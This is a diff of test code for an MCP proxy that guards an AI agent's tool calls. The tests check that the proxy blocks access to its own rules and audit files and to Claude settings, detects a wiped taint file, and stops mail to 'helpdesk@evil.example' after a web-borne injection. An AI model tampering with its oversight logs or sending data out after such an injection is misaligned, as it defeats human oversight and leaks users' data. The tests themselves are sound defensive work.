@@ -73,6 +73,42 @@ class RulesTest(unittest.TestCase):
         self.assertEqual(rules.DENY, rules.decide(self.note, {"text": "x"}, s, c, now=104).verdict)
         self.assertEqual(rules.AUTO, rules.decide(self.note, {"text": "x"}, s, c, now=200).verdict)
 
+    def test_own_files_and_client_settings_are_off_limits(self):
+        home = os.path.expanduser("~")
+        c = rules.Config(levels={"*": rules.AUTO})  # even "Do it" for everything can't open these
+        c.protect(os.path.join(home, "work", "mcp-rules.json"), os.path.join(home, "logs", "audit.jsonl"))
+        s = rules.Session()
+        refused = [
+            {"path": "~/.agentdodont/mcp-audit.jsonl"},
+            {"path": os.path.join(home, ".agentdodont", "sessions", "x.jsonl")},
+            {"path": home.replace("\\", "/") + "/.AgentDoDont/../.agentdodont/x"},  # case, ..
+            {"source": "notes.txt", "destination": "/srv/p/.claude/settings.json"},  # a project's Claude settings
+            {"path": r"C:\Users\x\AppData\Roaming\Claude\claude_desktop_config.json"},
+            {"paths": ["a.txt", ".mcp.json"]},
+            {"path": os.path.join(home, "work", "mcp-rules.json")},
+            {"path": "mcp-rules.json"},  # relative to a server root that holds it
+            {"path": "work/mcp-rules.json"},
+            {"path": "file:///" + home.replace("\\", "/") + "/logs/audit.jsonl"},
+            {"edits": [{"target": "~/.claude.json"}]},
+        ]
+        for args in refused:
+            d = rules.decide(self.note, args, s, c)
+            self.assertEqual(rules.DENY, d.verdict, args)
+            self.assertIn("belongs to Agent Do/Don't", d.rule)
+            self.assertEqual(rules.DENY, rules.decide(self.fetch, args, s, c).verdict, args)  # reading too
+        allowed = [
+            {"path": "notes/agentdodont.md"},
+            {"path": os.path.join(home, "work", "other.json")},
+            {"text": "my rules live in ~/.agentdodont/mcp-rules.json"},  # prose that mentions it
+            {"url": "https://github.com/x/y/tree/main/.claude"},  # a web address, not a file
+            {"path": os.path.join(home, "work")},  # reading the folder that holds the rules file
+        ]
+        for args in allowed:
+            self.assertEqual(rules.AUTO, rules.decide(self.fetch if "url" not in args else self.note, args, s, c).verdict, args)
+        # Moving or deleting a folder that holds a protected file takes it along: refused.
+        self.assertEqual(rules.DENY, rules.decide(self.note, {"source": os.path.join(home, "work")}, s, c).verdict)
+        self.assertEqual(rules.DENY, rules.decide(self.note, {"path": "work"}, s, c).verdict)
+
 
 class ProxyClient:
     """A scripted MCP client running one proxy in front of the fake server."""
@@ -330,6 +366,36 @@ class ProxyEndToEndTest(unittest.TestCase):
         self.assertTrue(r["isError"])
         self.assertIn("output of mail/fetch", r["content"][0]["text"])
 
+    def test_deleting_or_rewriting_the_shared_file_counts_as_tainted(self):
+        rules_json = {"allowed_sites": ["example.org"], "known_recipients": ["dana@example.com"]}
+        web = self.start(True, rules_json, name="web", session="s1")
+        mail = self.start(True, rules_json, name="mail", session="s1")
+        mail.call("write_note", {"text": "before"})  # mail has read the file at least once
+        web.call("fetch", {"url": "https://example.org/"})  # the injection arrives through web
+        f = Path(self.tmp.name) / "sessions" / "named-s1.jsonl"
+        f.write_text("")  # a hijacked agent with a shell wipes the taint
+        r, asked = mail.call("send_email", {"to": "helpdesk@evil.example", "body": "x"})
+        self.assertTrue(r["isError"])
+        self.assertIn("shared taint file", r["content"][0]["text"])
+        self.assertEqual(["write_note"], mail.reached_server())
+        kinds = [json.loads(l)["kind"] for l in self.audit.read_text().splitlines()]
+        self.assertIn("session_file_tampered", kinds)
+
+    def test_the_agent_cannot_reach_the_proxys_own_files(self):
+        c = self.start(True, {"levels": {"*": "auto"}})
+        rules_file = Path(self.tmp.name) / "rules-fake.json"
+        for args in ({"text": "x", "path": str(rules_file)}, {"text": "x", "path": "rules-fake.json"},
+                     {"text": "x", "path": str(self.audit)}, {"text": "x", "path": "~/.agentdodont/x"},
+                     {"text": "x", "path": str(Path(self.tmp.name) / "sessions" / "named-a.jsonl")},
+                     {"text": "x", "path": str(ROOT / "agentdodont" / "rules.py")}):
+            r, asked = c.call("write_note", args)
+            self.assertIsNone(asked)
+            self.assertTrue(r["isError"], args)
+            self.assertIn("belongs to Agent Do/Don't", r["content"][0]["text"])
+        self.assertEqual([], c.reached_server())
+        r, _ = c.call("write_note", {"text": "x", "path": "notes/today.md"})
+        self.assertFalse(r.get("isError"))
+
 
 class PresetTest(unittest.TestCase):
     FIELDS = {"risk", "untrusted_output", "sends_data_out", "destination_args"}
@@ -421,6 +487,21 @@ class SharedTaintTest(unittest.TestCase):
             off.add("output of web/fetch", "web")
             self.assertIsNone(off.path)
             self.assertEqual([], off.sources())
+
+    def test_a_shrunk_or_missing_file_is_tampering(self):
+        with tempfile.TemporaryDirectory() as d:
+            a = shared.SharedTaint.open(Path(d), "x")
+            b = shared.SharedTaint.open(Path(d), "x")
+            a.join("web")
+            b.join("mail")
+            a.add("output of web/fetch", "web")
+            self.assertEqual(["output of web/fetch"], b.sources())
+            a.add("output of web/other", "web")  # growing is fine
+            self.assertNotIn(shared.TAMPERED, b.sources())
+            a.path.unlink()
+            self.assertEqual([shared.TAMPERED], b.sources())
+            a.add("output of web/fetch", "web")  # recreated: still counts, and stays counted
+            self.assertEqual([shared.TAMPERED, "output of web/fetch"], b.sources())
 
     def test_sibling_proxies_find_the_same_client(self):
         code = "from agentdodont import shared; print(shared.find_client())"
